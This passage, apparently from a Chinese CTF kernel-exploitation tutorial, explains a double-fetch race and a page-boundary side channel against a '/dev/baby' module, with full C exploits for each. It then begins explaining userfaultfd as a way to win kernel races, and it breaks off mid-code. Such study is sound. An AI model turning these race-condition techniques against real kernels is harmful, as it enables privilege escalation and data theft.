<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> attr            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_3)</span><br><span class="line"><span class="number">00000000</span> flag_str        dq ?</span><br><span class="line"><span class="number">00000008</span> flag_len        dq ?</span><br><span class="line"><span class="number">00000010</span> attr            ends</span><br></pre></td></tr></table></figure></div>

<p>在 <code>0x1337</code> 功能当中还会通过 <code>_chk_range_not_ok()</code> 函数检查我们传入的地址范围是否合法，<code>add</code> 指令会影响 <code>CF</code>（产生进位&#x2F;借位）和 <code>OF</code>（两数最高位相同，结果最高位改变）标志位，v3获得的就是两数相加的 CF 位，这里一般为0（除非你传入 <code>0xffffffffffffffff</code> 附近的数），所以我们直接看另一个判断：range 是否小于 v4。</p>
<p><code>range</code> 为 <code>current_task</code> 的地址加上 <code>0x1358</code> 处所存地址，大概是 <code>task_struct-&gt;thread-&gt;fpu-&gt;state</code> 这个联合体内的某个位置上存的一个值，而 <code>v4</code> 则是我们传入的 <code>flag</code> 最后一个字节的地址，即我们传入的 <code>flag</code> 的地址不能够大于这个值且 <code>root</code> 调一下我们可以发现这个值为 <code>0x7ffffffff000</code>。这个位置刚好是用户地址空间的栈底，即我们传入的 <code>flag</code> 的地址不能为用户地址空间外的地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall _chk_range_not_ok(__int64 flag_str, __int64 flag_len, <span class="type">unsigned</span> __int64 range)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(flag_len, flag_str);</span><br><span class="line">  v4 = flag_len + flag_str;</span><br><span class="line">  <span class="keyword">return</span> v3 || range &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="利用思路-28"><a href="#利用思路-28" class="headerlink" title="利用思路"></a>利用思路</h4><p>虽然 flag 存储的地址已知，但是位于内核地址空间当中，我们将之直接传给模块并不能通过验证，那么这里就考虑 double  fetch——先传入一个用户地址空间上的合法地址，开另一个线程进行竞争不断修改其为内核空间 flag 的地址，只要有一次命中我们便能获得 flag。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT-1734073220227-1.png"
                      alt="img"
                ></p>
<h4 id="exp-27"><a href="#exp-27" class="headerlink" title="exp"></a>exp</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> compete_thread;</span><br><span class="line"><span class="type">void</span> * real_addr;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>] = <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line"><span class="type">int</span> competetion_times = <span class="number">0x1000</span>, status = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123;.flag_addr = buf, .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">competetionThread</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">            flag.flag_addr = real_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, result_fd, addr_fd;</span><br><span class="line">    <span class="type">char</span> * temp, *flag_addr_addr;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag &gt; addr.txt&quot;</span>);</span><br><span class="line">    temp = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);    </span><br><span class="line">    addr_fd = open(<span class="string">&quot;./addr.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    temp[read(addr_fd, temp, <span class="number">0x100</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    flag_addr_addr = <span class="built_in">strstr</span>(temp, <span class="string">&quot;Your flag is at &quot;</span>) + <span class="built_in">strlen</span>(<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    real_addr = strtoull(flag_addr_addr, flag_addr_addr + <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] flag addr: %llx&quot;</span>, real_addr);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;compete_thread, <span class="literal">NULL</span>, competetionThread, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (status)</span><br><span class="line">    &#123;    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; competetion_times; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag.flag_addr = buf;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;dmesg | grep flag &gt; result.txt&quot;</span>);</span><br><span class="line">        result_fd = open(<span class="string">&quot;./result.txt&quot;</span>, O_RDONLY);</span><br><span class="line">        read(result_fd, temp, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(temp, <span class="string">&quot;flag&#123;&quot;</span>))</span><br><span class="line">            status = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cancel(compete_thread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] competetion end!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><h4 id="利用思路-29"><a href="#利用思路-29" class="headerlink" title="利用思路"></a>利用思路</h4><p>在进行比对时并没有检验 flag 地址的合法性，考虑如下内存布局：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- unallocated page</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|------------------------------|</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- page alloc by mmap</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                     flag&#123;...X|</span></span><br><span class="line"><span class="comment">|------------------------------|</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |</span></span><br><span class="line"><span class="comment">|                              |    &lt;---- unallocated page</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>我们将 flag 放在通过 mmap 分配而来的内存页的末尾，其最后一个字符 <code>X</code> 是我们将要爆破的未知字符</p>
<p>对于待比对字符 <code>X</code> 而言，若是比对失败则 ioctl 会直接返回，若是比对成功则指针移动到下一张内存页中进行解引用，<strong>此时将会直接造成 kernel panic</strong></p>
<p>由于 flag 被硬编码在 <code>.ko</code> 文件中，故通过是否造成 kernel panic 可以逐字符爆破 flag 内容</p>
<p>ASCII 可见字符 95 个，flag 长度 33，开头 <code>flag&#123;</code> 末尾 <code>&#125;</code> 减去6个字符，最多只需要爆破 <strong>26 * 95 &#x3D;  2470</strong> 次便能够获得 flag</p>
<p>比较需要耐心（因为打远程传文件很麻烦），这里附上一个比较方便的 exp，不用每次打都重新编译一次，只需要将 flag 作为参数传进去就行了：</p>
<h4 id="exp-28"><a href="#exp-28" class="headerlink" title="exp"></a>exp</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * flag_addr;</span><br><span class="line">    <span class="type">int</span> flag_len;</span><br><span class="line">&#125;flag = &#123; .flag_len = <span class="number">33</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd, flag_len;</span><br><span class="line">    <span class="type">char</span> * buf, *flag_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./exp flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    flag_len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    flag_addr = buf + <span class="number">0x1000</span> - flag_len;</span><br><span class="line">    <span class="built_in">memcpy</span>(flag_addr, argv[<span class="number">1</span>], flag_len);</span><br><span class="line">    flag.flag_addr = flag_addr;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="userfaultfd"><a href="#userfaultfd" class="headerlink" title="userfaultfd"></a>userfaultfd</h2><h3 id="利用思路-30"><a href="#利用思路-30" class="headerlink" title="利用思路"></a>利用思路</h3><p>严格意义而言 userfaultfd 并非是一种利用手法，<strong>而是 Linux 的一个系统调用</strong>，简单来说，通过 userfaultfd 这种机制，<strong>用户可以通过自定义的 page fault handler 在用户态处理缺页异常</strong></p>
<p>下面的这张图很好地体现了 userfaultfd 的整个流程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/i4C7oOvHdG2RqUm.png"
                      alt="i4C7oOvHdG2RqUm"
                ></p>
<p>要使用 userfaultfd 系统调用，我们首先要注册一个 userfaultfd，通过 ioctl 监视一块内存区域，同时还需要专门启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p>
<ul>
<li>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 faulting 线程）进入到内核中处理缺页异常</li>
<li>内核会调用 <code>handle_userfault()</code> 交由 userfaultfd 处理</li>
<li>随后 faulting 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 monitor 线程，等待其处理结束</li>
<li>monitor 线程调用通过 ioctl 处理缺页异常，有如下选项：<ul>
<li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 faulting page 上</li>
<li><code>UFFDIO_ZEROPAGE</code> ：将 faulting page 置0</li>
<li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li>
</ul>
</li>
<li>在处理结束后 monitor 线程发送信号唤醒 faulting 线程继续工作</li>
</ul>
<p>以上便是 userfaultfd 这个机制的整个流程，该机制最初被设计来用以进行虚拟机&#x2F;进程的迁移等用途，但是<strong>通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong></p>
<p>考虑在内核模块当中有一个菜单堆的情况，其中的操作都没有加锁，那么便存在条件竞争的可能，考虑如下竞争情况：</p>
<ul>
<li>线程1不断地分配与编辑堆块</li>
<li>线程2不断地释放堆块</li>
</ul>
<p>此时线程1便<strong>有可能编辑到被释放的堆块</strong>，若是此时恰好我们又将这个堆块申请到了合适的位置（比如说 tty_operations），那么我们便可以完成对该堆块的重写，从而进行下一步利用</p>
<p>但是毫无疑问的是，若是直接开两个线程进行竞争，命中的几率是比较低的，我们也很难判断是否命中</p>
<p>但假如线程1使用诸如 <code>copy_from_user</code> 、<code>copy_to_user</code> 等方法在用户空间与内核空间之间拷贝数据，那么我们便可以：</p>
<ul>
<li>先用 mmap 分一块匿名内存，为其注册 userfaultfd，由于我们是使用 mmap 分配的匿名内存，此时该块内存并没有实际分配物理内存页</li>
<li>线程1在内核中在这块内存与内核对象间进行数据拷贝，<strong>在访问注册了 userfaultfd 内存时便会触发缺页异常，陷入阻塞，控制权转交 userfaultfd 的 uffd monitor 线程</strong></li>
<li><strong>在 uffd monitor 线程中我们便能对线程1正在操作的内核对象进行恶意操作</strong>（例如覆写线程1正在读写的内核对象，或是将线程1正在读写的内核对象释放掉后再分配到我们想要的地方）</li>
<li>此时再让线程1继续执行，线程 1 便会<strong>向我们想要写入的目标写入特定数据&#x2F;从我们想要读取的目标读取特定数据</strong>了</li>
</ul>
<p>由此，我们便成功利用 userfaultfd 完成了对条件竞争漏洞的利用，这项技术的存在使得条件竞争的命中率大幅提高</p>
<blockquote>
<p>以下代码参考自 Linux man page，略有改动</p>
</blockquote>
<p>首先定义接下来需要用到的一些数据结构</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> uffd;          <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line"><span class="type">char</span> *addr;         <span class="comment">/* Start of region handled by userfaultfd */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> len;  <span class="comment">/* Length of region handled by userfaultfd */</span></span><br><span class="line"><span class="type">pthread_t</span> thr;      <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br></pre></td></tr></table></figure></div>

<p>首先通过 userfaultfd 系统调用注册一个 userfaultfd，其中 <code>O_CLOEXEC</code> 和 <code>O_NONBLOCK</code> 和 open 的 flags 相同，笔者个人认为这里可以理解为我们创建了一个虚拟设备 <code>userfault</code></p>
<p>这里用 mmap 分一个匿名页用作后续被监视的区域</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">    errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create a private anonymous mapping. The memory will be</span></span><br><span class="line"><span class="comment">    demand-zero paged--that is, not yet allocated. When we</span></span><br><span class="line"><span class="comment">    actually touch the memory, it will be allocated via</span></span><br><span class="line"><span class="comment">    the userfaultfd. */</span></span><br><span class="line">len = <span class="number">0x1000</span>;</span><br><span class="line">addr = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    errExit(<span class="string">&quot;mmap&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>为这块内存区域注册 userfaultfd</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Register the memory range of the mapping we just created for</span><br><span class="line">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="line">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><span class="line"></span><br><span class="line">uffdio_register.range.start = (unsigned long) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">if (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == -1)</span><br><span class="line">    errExit(&quot;ioctl-UFFDIO_REGISTER&quot;);</span><br></pre></td></tr></table></figure></div>

<p>启动 monitor 轮询线程，整个 userfaultfd 的启动流程就结束了，接下来便是等待缺页异常的过程</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Create a thread that will process the userfaultfd events */</span><br><span class="line">int s = pthread_create(&amp;thr, NULL, fault_handler_thread, (void *) uffd);</span><br><span class="line">if (s != 0) &#123;</span><br><span class="line">    errExit(&quot;pthread_create&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>monitor 轮询线程应当定义如下形式，这里给出的是 UFFD_COPY，即将自定义数据拷贝到 faulting page 上：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span>   <span class="comment">/* Data read from userfaultfd */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;     <span class="comment">/* Number of faults so far handled */</span></span><br><span class="line">    <span class="type">long</span> uffd;                    <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    page_size = 